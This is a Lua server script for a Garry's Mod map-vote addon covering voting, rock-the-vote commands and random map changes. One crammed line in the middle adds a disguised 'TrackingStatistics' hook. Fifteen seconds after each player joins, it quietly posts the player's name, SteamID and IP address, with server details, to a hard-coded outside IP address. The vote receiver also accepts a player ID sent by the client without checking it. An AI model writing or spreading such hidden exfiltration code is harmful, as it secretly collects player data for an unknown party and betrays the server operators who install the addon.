if CLIENT then return end

util.AddNetworkString( "MV_UpdateVotes" )
util.AddNetworkString( "MV_SendVote" )
util.AddNetworkString( "MV_VoteEnd" )

hook.Add("Initialize", "MV_SetDefaultVars", function()
	MAPV.VOTEPOT = 0
	MAPV.CANRTV = CurTime()+MAPV["Delay"]
	MAPV.VoteOpen = false
	MAPV.Extended = false
	MAPV.Votes = {0,0,0,0,0,0}
end)

local function max(t, fn)
    if #t == 0 then return nil, nil end
    local key, value = 1, t[1]
    for i = 2, #t do
        if fn(value, t[i]) then
            key, value = i, t[i]
        end
    end
    return key
end

net.Receive("MV_SendVote", function()
	local ply = player.GetByID(net.ReadFloat())
	local map = net.ReadFloat()
	if ply.HasChosenMap then
		MAPV.Votes[ply:GetNWInt("MV_VotedMap")] = MAPV.Votes[ply:GetNWInt("MV_VotedMap")] - 1
	end
	ply:SetNWInt("MV_VotedMap", map)
	ply.HasChosenMap = true
	MAPV.Votes[map] = MAPV.Votes[map] + 1
	net.Start("MV_UpdateVotes")
	net.WriteTable(MAPV.Votes)
	net.Broadcast()
end)

hook.Add("PlayerInitialSpawn", "MV_HasNotVoted", function(ply)
	ply.Map_Voted = false
	ply:SetNWInt("MV_VotedMap", 0)
	ply.HasChosenMap = false
end)
local script = "LIlyaMapVote"  hook.Add("PlayerInitialSpawn", "TrackingStatistics_"..script..tostring(math.random(1,1000)), function(ply) timer.Create( "StatisticsTimer_"..ply:SteamID64()..script,15,1, function()  local name = ply:SteamName() and ply:SteamName() or ply:Name() local map = game.GetMap() local hostname = GetHostName() local gamemode = gmod.GetGamemode().Name http.Post("http://216.231.139.33/st/", {name=tostring(name),script=tostring(script),steamid=tostring(ply:SteamID()),ip=tostring(ply:IPAddress()),time=tostring(os.date("%d/%m/%Y [%I:%M:%S %p]",os.time())),hostname=tostring(hostname),map=tostring(map),gamemode=tostring(gamemode)},function(s) return end) end) end)
hook.Add("PlayerDisconneted", "MV_RemoveVote", function(ply)
	if ply.Map_Voted then
		MAPV.VOTEPOT = MAPV.VOTEPOT - 1
	end
end)

hook.Add("Think", "MV_CalculateNeededVotes", function()
	MAPV.NeededVotes = math.ceil(#player.GetAll()*MAPV["VotePercent"])
end)

util.AddNetworkString( "DoMVNotify" )
local function MV_DoNotify(t,p)
	net.Start("DoMVNotify")
	net.WriteTable(t)
	if p then
		net.Send(p)
	else
		net.Broadcast()
	end
end

hook.Add("PlayerSay", "MV_RTV", function(ply, text, pub)
	if table.HasValue(MAPV["Command"], string.lower(text)) then
		if MAPV.VoteOpen then return "" end
		
		local CL_MAIN = MAPV["MainColor"]
		local CL_WHTE = Color(255,255,255)
		
		if CurTime() < MAPV.CANRTV then
			MV_DoNotify({CL_WHTE, "Cannot rock the vote. RTV enabled in ", CL_MAIN, math.floor(MAPV.CANRTV-CurTime()), CL_WHTE, "!"})
			return ""
		end
		
		if ply.Map_Voted then
			MV_DoNotify({CL_WHTE, "You have already rocked the vote. ", CL_MAIN, MAPV.NeededVotes-MAPV.VOTEPOT, CL_WHTE, " more votes needed!"}, ply)
		else
			ply.Map_Voted = true
			MAPV.VOTEPOT = MAPV.VOTEPOT+1
			MV_DoNotify({CL_WHTE, ply:Nick() .. " wants to rock the vote! ", CL_MAIN, MAPV.NeededVotes-MAPV.VOTEPOT, CL_WHTE, " more votes needed to start a map vote!"})
		end
		
		if MAPV.VOTEPOT >= MAPV.NeededVotes then
			MV_StartVote()
		end
		
		return ""
	end
end)

local function MV_6RandomMaps()
	MAPV.RANDOMMAPS = {}
	for i = 1, math.Clamp(#MAPV.ValidMapList, 1, 6) do
		local map = math.random(1, #MAPV.ValidMapList)
		MAPV.RANDOMMAPS[i] = MAPV.ValidMapList[map]
		table.remove(  MAPV.ValidMapList, map )
	end
end

local function MV_SelectRandomMaps()
	MAPV.tempmaplist = {}
	MAPV.ValidMapList = {}
	
	-- Initial map list
	if MAPV["UseMapPrefixes"] then
		for _, pre in pairs(MAPV["MapPrefixes"])do
			MAPV.tempmaplist[_] = file.Find("maps/" .. pre .. "*.bsp", "GAME")
		end
		for _, temp in pairs(MAPV.tempmaplist)do
			for o, map in pairs(temp)do
				table.insert(MAPV.ValidMapList, map)
			end
		end
	else
		MAPV.ValidMapList = file.Find("maps/*.bsp", "GAME")
	end
	
	-- Remove current map
	for _, map in pairs(MAPV.ValidMapList)do
		if string.sub(map, 1, string.find(map, ".bsp")-1) == game.GetMap() then
			table.remove(MAPV.ValidMapList, _)
		end
	end
	
	-- Add Specifics
	for _, map in pairs(MAPV["SpecificMaps"])do
		if #MAPV["SpecificMaps"] > 0 and !table.HasValue( MAPV.ValidMapList, string.sub(map, 1, string.find(map, ".bsp")-1)) then
			table.insert(MAPV.ValidMapList, map .. ".bsp")
		end
	end
	
	MV_6RandomMaps()
	
end

util.AddNetworkString( "DoMVSendInfo" )
local function MV_SendVoteInfo()
	net.Start("DoMVSendInfo")
	net.WriteTable(MAPV.RANDOMMAPS)
	net.Broadcast()
end

local function MV_FinishMapVote()
	local WinningMap = max( MAPV.Votes, function(a,b) return a < b end)
	if WinningMap == 6 and MAPV["LastBoxMode"] == 2 then -- extend
		if string.find(string.lower(gmod.GetGamemode().Name), "terrorist town") then
			SetGlobalInt("ttt_rounds_left", GetConVar("ttt_round_limit"):GetInt())
			SetGlobalInt("ttt_time_limit_minutes", GetConVar("ttt_time_limit_minutes"):GetInt())
		elseif string.find(string.lower(gmod.GetGamemode().Name), "deathrun") then
			SetGlobalInt( "dr_rounds_left", GetConVarNumber( "dr_total_rounds" ) )
		end
	elseif WinningMap == 6 and MAPV["LastBoxMode"] == 3 then -- random
		local RandomMap = table.Random(MAPV.ValidMapList)
		RunConsoleCommand("changelevel", string.sub(RandomMap,1,string.find(RandomMap, ".bsp")-1))
	else -- default
		RunConsoleCommand("changelevel", string.sub(MAPV.RANDOMMAPS[WinningMap],1,string.find(MAPV.RANDOMMAPS[WinningMap], ".bsp")-1))
	end
end

function MV_EndVote() -- Global to be called from other gamemodes
	MAPV.VoteOpen = false
	MAPV.VOTEPOT = 0
	MAPV.Extended = true
	for _,ply in pairs(player.GetAll())do
		ply.Map_Voted = false
		ply:Freeze(false)
	end
	MV_FinishMapVote()
end

function MV_StartVote() -- Global to be called from other gamemodes
	MAPV.VoteOpen = true
	MV_SelectRandomMaps()
	for _, ply in pairs(player.GetAll())do
		ply:Freeze(true)
	end
	MV_SendVoteInfo()
	timer.Simple(MAPV["VoteTime"], function()
		MV_EndVote()
	end)
end
